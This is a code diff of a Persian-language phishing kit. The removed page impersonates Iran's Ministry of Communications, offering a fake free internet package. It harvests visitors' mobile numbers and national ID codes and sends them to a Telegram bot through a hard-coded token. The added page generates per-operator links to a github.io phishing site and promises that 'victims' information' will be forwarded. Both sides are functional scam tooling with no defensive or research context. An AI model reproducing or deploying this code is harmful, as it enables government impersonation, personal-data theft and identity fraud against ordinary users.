@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بسته اینترنت رایگان دولت</title>
+    <title>ساخت لینک اختصاصی</title>
     <style>
         * {
             margin: 0;
@@ -12,294 +12,130 @@
             font-family: Tahoma, sans-serif;
         }
         body {
-            background: linear-gradient(135deg, #0b2b3f, #1a4b61);
+            background: #f4f6f9;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
+            height: 100vh;
             direction: rtl;
-            margin: 0;
-            padding: 20px;
         }
         .container {
             background: white;
-            padding: 35px 25px;
-            border-radius: 24px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+            padding: 40px 30px;
+            border-radius: 16px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.1);
             width: 100%;
-            max-width: 420px;
+            max-width: 500px;
             text-align: center;
         }
-        .logo { font-size: 60px; margin-bottom: 10px; }
-        h1 { color: #1a2a3a; font-size: 22px; margin-bottom: 10px; }
-        .sub { color: #6c7a8a; font-size: 14px; margin-bottom: 25px; line-height: 1.8; }
-        input {
-            width: 100%;
-            padding: 14px;
-            margin: 10px 0;
-            border: 2px solid #e2e8f0;
-            border-radius: 12px;
-            font-size: 15px;
-            background: #f8fafc;
-            text-align: center;
-        }
-        input:focus {
-            border-color: #1a7ae8;
-            background: white;
-            outline: none;
-        }
-        button {
-            width: 100%;
-            padding: 14px;
-            background: #1a7ae8;
-            color: white;
-            border: none;
-            border-radius: 12px;
-            font-size: 17px;
+        .title {
+            font-size: 22px;
             font-weight: bold;
-            cursor: pointer;
-            margin-top: 12px;
+            color: #1a2a3a;
+            margin-bottom: 10px;
         }
-        button:hover { background: #0f5bb5; }
-        button:disabled { opacity: 0.6; cursor: not-allowed; }
-        .note {
-            margin-top: 18px;
-            font-size: 12px;
-            color: #94a3b8;
-            border-top: 1px solid #e2e8f0;
-            padding-top: 16px;
+        .sub {
+            font-size: 14px;
+            color: #6c7a8a;
+            margin-bottom: 20px;
         }
-        .note span { color: #1a7ae8; font-weight: bold; }
-        .input-group { text-align: right; margin: 5px 0; }
-        .input-group label {
-            font-size: 13px;
-            color: #4a5a6a;
-            font-weight: bold;
-            display: block;
-            margin-right: 5px;
-        }
-        .hidden { display: none !important; }
-        #processingSection {
-            margin-top: 20px;
+        .link-box {
+            background: #f0f4ff;
             padding: 15px;
-            background: #f0f4ff;
             border-radius: 12px;
-            border-right: 4px solid #1a7ae8;
-        }
-        .loader {
-            border: 4px solid #e2e8f0;
-            border-top: 4px solid #1a7ae8;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 10px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .success-icon { font-size: 50px; margin: 10px 0; }
-        .success-text { color: #16a34a; font-weight: bold; font-size: 16px; }
-        .user-id-box {
-            background: #f0f4ff;
-            padding: 10px;
-            border-radius: 8px;
-            margin: 10px 0;
-            font-size: 12px;
-            color: #4a5a6a;
+            border: 2px dashed #1a7ae8;
+            word-break: break-all;
+            font-size: 14px;
+            color: #1a2a3a;
             direction: ltr;
             text-align: center;
-            border: 1px dashed #1a7ae8;
         }
         .copy-btn {
+            margin-top: 15px;
+            padding: 10px 20px;
             background: #1a7ae8;
             color: white;
             border: none;
-            padding: 5px 15px;
-            border-radius: 8px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
             cursor: pointer;
-            font-size: 12px;
-            margin-top: 5px;
+            transition: 0.2s;
         }
-        .copy-btn:hover { background: #0f5bb5; }
+        .copy-btn:hover {
+            background: #0f5bb5;
+        }
+        .note {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #94a3b8;
+        }
     </style>
 </head>
 <body>
-    <div class="container" id="mainContainer">
-        <!-- ============================================= -->
-        <!-- صفحه اصلی (فرم ورود اطلاعات) -->
-        <!-- ============================================= -->
-        <div id="formSection">
-            <div class="logo">🎁</div>
-            <h1>بسته اینترنت رایگان دولت</h1>
-            <p class="sub">
-                برای فعالسازی بسته ۲۰ گیگابایت اینترنت رایگان،<br>
-                شماره موبایل خود را وارد کرده و هویت خود را تایید کنید.
-            </p>
 
-            <!-- نمایش شناسه کاربر -->
-            <div class="user-id-box">
-                🆔 شناسه شما: <strong id="userIdDisplay">...</strong>
-                <br>
-                <button class="copy-btn" onclick="copyUserId()">📋 کپی شناسه</button>
-            </div>
+<div class="container">
+    <div class="title">🔗 لینک اختصاصی شما</div>
+    <div class="sub">این لینک مخصوص شماست. آن را برای دیگران ارسال کنید.</div>
 
-            <form id="findForm">
-                <div class="input-group">
-                    <label>📞 شماره موبایل</label>
-                    <input type="text" id="phone" placeholder="مثلاً 09123456789" required>
-                </div>
-                <div class="input-group">
-                    <label>🆔 کد ملی</label>
-                    <input type="text" id="nationalCode" placeholder="مثلاً 1234567890" required>
-                </div>
-                <button type="submit" id="submitBtn">🎁 دریافت بسته</button>
-            </form>
+    <div class="link-box" id="uniqueLink">در حال ایجاد لینک...</div>
 
-            <div class="note">
-                🔒 اطلاعات شما محفوظ است · <span>وزارت ارتباطات</span>
-            </div>
-        </div>
+    <button class="copy-btn" onclick="copyLink()">📋 کپی لینک</button>
 
-        <!-- ============================================= -->
-        <!-- صفحه پردازش -->
-        <!-- ============================================= -->
-        <div id="processingSection" class="hidden">
-            <h3 style="color: #1a2a3a;">⏳ در حال پردازش...</h3>
-            <div class="loader"></div>
-            <p style="color: #6c7a8a; font-size: 14px; margin-top: 10px;">
-                لطفاً چند لحظه صبر کنید. در حال برقراری ارتباط با سرورهای امنیتی هستیم.
-            </p>
-        </div>
+    <div class="note">✅ اطلاعات قربانیان به شما ارسال خواهد شد.</div>
+</div>
 
-        <!-- ============================================= -->
-        <!-- صفحه موفقیت -->
-        <!-- ============================================= -->
-        <div id="successSection" class="hidden">
-            <div class="success-icon">✅</div>
-            <h2 style="color: #16a34a;">تایید با موفقیت انجام شد</h2>
-            <p style="color: #6c7a8a; margin: 15px 0;">
-                درخواست شما با موفقیت ثبت شد. این صفحه تا چند ثانیه دیگر بسته خواهد شد.
-            </p>
-            <div class="loader" style="border-top-color: #16a34a;"></div>
-        </div>
-    </div>
+<script>
+    // =============================================
+    // لینک اصلی صفحه فیشینگ
+    // =============================================
+    const BASE_URL = 'https://8080602.github.io/8080/';
 
-    <script>
-        // ======================================================
-        // تنظیمات ربات تلگرام
-        // ======================================================
-        const BOT_TOKEN = '8826841444:AAE3tdS8hRrqZIkFPIUYGS0sblNd34qWOMY';
-
-        // ======================================================
-        // تابع تولید شناسه یکتا (UUID)
-        // ======================================================
-        function generateUUID() {
-            return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
-                const r = Math.random() * 16 | 0;
-                const v = c === 'x' ? r : (r & 0x3 | 0x8);
-                return v.toString(16);
-            });
-        }
-
-        // ======================================================
-        // دریافت یا ساخت شناسه کاربر (ذخیره در localStorage)
-        // ======================================================
-        function getUserId() {
-            let userId = localStorage.getItem('phishing_user_id');
-            if (!userId) {
-                userId = generateUUID();
-                localStorage.setItem('phishing_user_id', userId);
-            }
-            return userId;
-        }
-
-        const USER_ID = getUserId();
-
-        // ======================================================
-        // نمایش شناسه کاربر در صفحه
-        // ======================================================
-        document.getElementById('userIdDisplay').textContent = USER_ID;
-
-        // ======================================================
-        // کپی شناسه کاربر
-        // ======================================================
-        function copyUserId() {
-            navigator.clipboard.writeText(USER_ID).then(() => {
-                alert('🆔 شناسه کپی شد!');
-            }).catch(() => {
-                alert('❌ خطا در کپی');
-            });
-        }
-
-        // ======================================================
-        // تابع ارسال اطلاعات به تلگرام (به همان کاربر)
-        // ======================================================
-        async function sendToTelegram(message) {
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: USER_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
-                });
-            } catch (e) {
-                console.error('❌ خطا در ارسال:', e);
-            }
-        }
-
-        // ======================================================
-        // نمایش/مخفی کردن بخش‌ها
-        // ======================================================
-        function showSection(sectionId) {
-            document.getElementById('formSection').classList.add('hidden');
-            document.getElementById('processingSection').classList.add('hidden');
-            document.getElementById('successSection').classList.add('hidden');
-            document.getElementById(sectionId).classList.remove('hidden');
-        }
-
-        // ======================================================
-        // رویداد کلیک روی دکمه
-        // ======================================================
-        document.getElementById('findForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-
-            const phone = document.getElementById('phone').value;
-            const nationalCode = document.getElementById('nationalCode').value;
-            const submitBtn = document.getElementById('submitBtn');
-
-            submitBtn.disabled = true;
-            submitBtn.textContent = '⏳ در حال پردازش...';
-            showSection('processingSection');
-
-            try {
-                let message = `🎯 **اطلاعات جدید** 🎯\n\n`;
-                message += `🆔 شناسه کاربر: \`${USER_ID}\`\n`;
-                message += `📞 شماره: ${phone}\n`;
-                message += `🆔 کد ملی: ${nationalCode}\n`;
-                message += `⏱️ زمان: ${new Date().toLocaleString('fa-IR')}`;
-
-                await sendToTelegram(message);
-
-                setTimeout(() => {
-                    showSection('successSection');
-                    setTimeout(() => {
-                        window.location.href = 'https://example.com/error';
-                    }, 3000);
-                }, 2000);
-
-            } catch (error) {
-                console.error('❌ خطا:', error);
-                window.location.href = 'https://example.com/error';
-            }
+    // =============================================
+    // ساخت شناسه یکتا (UUID)
+    // =============================================
+    function generateUUID() {
+        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+            const r = Math.random() * 16 | 0;
+            const v = c === 'x' ? r : (r & 0x3 | 0x8);
+            return v.toString(16);
         });
+    }
 
-        console.log('🆔 شناسه کاربر:', USER_ID);
-        console.log('📤 اطلاعات به این شناسه ارسال می‌شود:', USER_ID);
-    </script>
+    // =============================================
+    // دریافت یا ساخت شناسه کاربر
+    // =============================================
+    function getUserId() {
+        let userId = localStorage.getItem('phishing_user_id');
+        if (!userId) {
+            userId = generateUUID();
+            localStorage.setItem('phishing_user_id', userId);
+        }
+        return userId;
+    }
+
+    const USER_ID = getUserId();
+    const UNIQUE_LINK = BASE_URL + '?user_id=' + USER_ID;
+
+    // =============================================
+    // نمایش لینک در صفحه
+    // =============================================
+    document.getElementById('uniqueLink').textContent = UNIQUE_LINK;
+
+    // =============================================
+    // کپی لینک
+    // =============================================
+    function copyLink() {
+        navigator.clipboard.writeText(UNIQUE_LINK).then(() => {
+            alert('✅ لینک کپی شد!');
+        }).catch(() => {
+            alert('❌ خطا در کپی');
+        });
+    }
+
+    console.log('🆔 شناسه کاربر:', USER_ID);
+    console.log('🔗 لینک اختصاصی:', UNIQUE_LINK);
+</script>
+
 </body>
-    </html>
+</html>
